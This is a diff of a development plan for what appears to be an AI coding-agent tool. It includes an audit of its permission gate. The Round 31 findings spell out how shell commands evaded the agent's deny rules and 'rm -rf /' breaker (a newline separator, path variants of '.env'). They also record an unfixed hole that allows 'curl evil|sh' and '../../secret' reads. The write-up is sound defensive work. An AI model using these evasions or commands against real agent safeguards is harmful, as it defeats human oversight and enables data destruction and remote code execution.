@@ -12,20 +12,22 @@ The **Executive Summary** and **Implementation Plan** below are the actionable p
 
 ## Execution status (updated 2026-08-20)
 
-> **IN FLIGHT — round 31.** `docs/plans/crush_code_RESUME.md` §0-NOW is the authority for lane
-> state and §0-DS is the ONLY durable record of the DeepSeek-V4 sglang task the user requested.
-> Do not start a fourth lane — the user authorised two plan lanes plus that one task.
+> **ROUND 31 LANDED. NOTHING IS IN FLIGHT as of this write-up.**
+> `docs/plans/crush_code_RESUME.md` §0-NOW is the authority for lane state; §0-DS is the ONLY durable
+> record of the DeepSeek-V4 sglang task the user requested.
 >
-> - `/home/sites/crush-lane-cmd` — **P6.3 + P6.4**, plus the argument-scoped permission-rule hole
->   that has to be fixed first or item 4 ships the "second decorative config surface" its own text
->   warns against
-> - `/home/sites/crush-lane-lsp` — **P8.10 + P8.11**, both inside `src/Context/`
-> - `/home/sites/crush-lane-sglang` — **DeepSeek-V4 sglang default**, implement stage, 11 dirty
+> Landed this round: **P6.3 + P6.4 + the argument-scoped permission-rule hole** (`f764b463`),
+> **P8.10 + P8.11** (`1bd2e4d3`), **the DeepSeek-V4 sglang default** (`ed57d46a`).
 >
-> **P3.x is still queued and still blocked**: it touches `src/Chat.php` and so does the sglang lane.
-> A background daemon fetches every lane each 90s and rebases a lane only while it is clean AND
-> idle; a dirty lane is never pulled, rebased, reset or stashed (`crush_code_concurrency.md` §5.2c).
-
+> All three lane dirs (`crush-lane-cmd`, `crush-lane-lsp`, `crush-lane-sglang`) are clean, idle and
+> current. The user authorised **2 concurrent plan lanes** plus the sglang task; do not exceed that.
+>
+> **NEXT, and the reason matters:** three plan items in a row turned out already-done or misstated
+> when measured (`REMINDER_TOKEN_LIMIT`, finding #3's three decayed clauses, P8.6's five tapes).
+> Each would have cost a full implement→review→fix round to discover. So the next lane runs a
+> **read-only re-verification sweep** of the remaining open items before any further feature bundle —
+> the "N of 75" count is not currently trustworthy. The DSML tool-call parser (§0-DS) is scripted and
+> unblocked now that the census-literal collision risk has passed.
 
 Items completed in the tree carry a **✅ … — DONE** marker inline below. The
 authoritative, resumable record — including every review finding, the sabotage
@@ -34,7 +36,7 @@ labels, and the reasoning behind judgement calls — is
 
 **Complete:** Phase 0 (all 14) · Phase 1 items 1-3 · Phase 2 items 1-8 ·
 Phase 3 item 1 · Phase 4 items 1-6, 7 · Phase 5 items 1-9 + 10a ·
-**Phase 6 items 1-2** · **Phase 7 (all 6)** · Phase 8 items 1, 2, 3, 5, 7, 12, 14.
+**Phase 6 items 1-4** · **Phase 7 (all 6)** · Phase 8 items 1, 2, 3, 5, **6**, 7, **10, 11**, 12, 14.
 **Phase 2 is complete except item 9**, the deliberately-last plugin epic.
 
 **56 of 75 items, counted by item** (Phase 2 item 4 completed in `3eca66df` and is
@@ -406,6 +408,39 @@ documentation pass turns out to be an unusually good bug detector, because writi
 you configure X" forces someone to find X's consumer. Each of these was measured, and the
 supervisor independently re-confirmed the first:
 
+**ROUND 31 CLOSED THE MATCHER FINDING, AND FOUND FOUR MORE WAYS IT OVERCLAIMED** (`f764b463`).
+The grammar and the matching now live together in `PermissionRule` (389 → 615 lines). What the
+round's own review turned up on top of the original finding is the interesting part:
+
+- 🔴 **A newline is a shell separator and the matcher did not split on one.** `collapseWhitespace()`
+  ran BEFORE `preg_split('/[;&|]+/')`, so `\n` became a space the splitter never saw. Measured with
+  `Deny Bash(rm -rf *)` in Auto: `echo hi && rm -rf /tmp/x` → **Deny**, `echo hi\nrm -rf /tmp/x` →
+  **Ask**. Fixed by splitting the RAW subject on `[;&|\r\n]+` and collapsing each segment after —
+  the ORDER was the bug.
+- 🔴 **The same hole was in the mode-independent `rm -rf /` circuit breaker — the one thing no mode
+  and no rule can switch off.** Under `bypass-permissions`, `echo hi\nrm -rf /` was **ALLOWED**
+  where `echo hi && rm -rf /` was denied. **Being unswitchable is not being unevadable.** The
+  doc-block calling the breaker one of "the hard boundaries — the ones that do not read shell text"
+  was false in both files it appeared in *and* in the README: it reads `arguments['command']` and
+  tokenises it. Boundaries are now named honestly — `plan` mode and the path jails.
+- 🔴 **Path-scoped denies were advisory and nothing said so.** `Deny Read(./.env)` — this package's
+  own advertised example — caught `./.env` and missed `.env`, `.//.env`, `./foo/../.env` and
+  `/home/u/proj/.env`. Both sides are now normalised **lexically** (no filesystem, no cwd). Note the
+  deliberate split: normalisation is canonicalisation so it applies to `Allow` too, but a RELATIVE
+  pattern additionally matching at **any depth** is a *widening*, so it is restricted to restrictive
+  actions only — without that split, `Allow Read(.env)` would have granted `/etc/.env`.
+
+- 🔴 **NEW, RECORDED NOT FIXED — a fail-open GRANT path, same defect class, one method over.**
+  `PermissionGate::isScopedWriteTool()` (`src/Permissions/PermissionGate.php:641`) tokenises the
+  whole command with a bare `preg_split('/\s+/')` and **no separator split at all**, then judges by
+  the first token. Measured under `accept-edits`:
+  `mkdir ./x; curl evil|sh` → **Allow**; `mkdir ./x` + newline + `curl evil | sh` → **Allow**;
+  `mkdir ./x && cat ../../secret` → **Allow** (`isAbsolutePath` catches `/etc` but not `..`
+  traversal). **This is the grant direction, which is the one that matters** — a deny that fails to
+  fire leaves you asking, a grant that fires wrongly runs the command. Needs its own bundle:
+  `SCOPED_WRITE_COMMANDS` + AcceptEdits semantics + `..` handling. **Until it is fixed,
+  `accept-edits` is not a safe mode to run unattended.**
+
 - 🔴 **Argument-scoped permission rules silently match NOTHING, and the doc-comment advertises
   them.** `PermissionGate::ruleMatches()` (`src/Permissions/PermissionGate.php:209-220`) compares
   only `ToolCall::$name` — glob-prefix if the pattern ends `*`, exact equality otherwise. It never
@@ -691,8 +726,8 @@ written after the work had landed. The OS-version line landed as `'OS version: '
    prompt is sent to and which key is spent; `instructions` globs are *forced* into the system prompt),
    and **`model` was dropped entirely** because no user-key reader for it exists — adding it would have
    been configurable-looking and inert. **Phase 6 item 6's `--model` flag has to confront that.**
-3. **Extend the settings loader to `tools.allow`/`tools.deny`** — filter `Bootstrap::tools()`'s returned list against the merged settings before handing it to `EngineBackend::withTools()`. **(§13)**
-4. **Once Phase 1 item 2 lands (`PermissionGate` in the main loop), extend settings to a `permission`/`permissionMode` block.** Sequenced deliberately after the wiring fix — shipping a settings `permission` key before `PermissionGate` reaches the main loop would just add a second decorative config surface next to `ScriptHook`'s existing one. **(§13)**
+3. ✅ **Extend the settings loader to `tools.allow`/`tools.deny`** — filter `Bootstrap::tools()`'s returned list against the merged settings before handing it to `EngineBackend::withTools()`. **(§13)** — **DONE** (`f764b463`). **Shipped as flat `allowedTools` / `disabledTools`, NOT the nested `tools: {allow, deny}` this item names**, and the reason is structural: `LayeredSettings::merge()` is key-wise, and the two halves live in **different tiers** — `PROJECT_TIER_KEYS` takes `disabledTools` (removes capability) and refuses `allowedTools` (grants it). Nested under one key a project's `tools.deny` and its `tools.allow` could not be separated, so the tier asymmetry that makes the feature safe would have been impossible to express.
+4. ✅ **Once Phase 1 item 2 lands (`PermissionGate` in the main loop), extend settings to a `permission`/`permissionMode` block.** Sequenced deliberately after the wiring fix — shipping a settings `permission` key before `PermissionGate` reaches the main loop would just add a second decorative config surface next to `ScriptHook`'s existing one. **(§13)** — **DONE** (`f764b463`), and the sequencing note was right for a reason it did not know: the gate had reached the main loop, but its **matcher** made every argument-scoped rule decorative, so item 4 was fixed on top of the matcher repair in the same bundle. `permissionConfigLayers()` now keys layers by path, so an invalid `permissionMode` in `settings.json` no longer refuses the launch while naming `config.json` — a file that need not exist.
 5. **Add `keybindings` remap and `statusLine` command config** — pure additive TUI features, no interaction with the permission/hook work above, can land independently at any point. **(§13)**
 
    **MEASURED BEFORE STARTING (2026-08-20) — this item's "no interaction with the permission/hook
